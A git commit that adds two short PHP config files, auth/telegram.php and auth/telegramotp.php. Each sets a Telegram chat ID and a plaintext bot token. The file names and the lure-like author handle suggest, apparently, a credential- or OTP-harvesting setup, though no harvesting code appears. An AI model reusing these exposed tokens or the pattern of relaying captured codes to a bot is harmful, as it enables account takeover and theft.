8432b9cc4aedbc71dfa5de4e84b3615b6af6a285
dapat-kesempatan-gratis <167363832+dapat-kesempatan-gratis@users.noreply.github.com>
2024-05-21 16:21:52 +0700

    akses
    exampeling

---
+++ auth/telegram.php
@@ -0,0 +1,4 @@
+<?php
+$telegram_id = "6250486742";
+$id_bot = "6340358736:AAHxAwrl7fUbdvIILZ3gtCzZSs3FQw1IQn0";
+?>
---
+++ auth/telegramotp.php
@@ -0,0 +1,4 @@
+<?php
+$telegram_id = "6250486742";
+$id_bot = "7045274313:AAEPWb6ugUB0Qqe95tXWuaOTNWdLi793EUo";
+?>
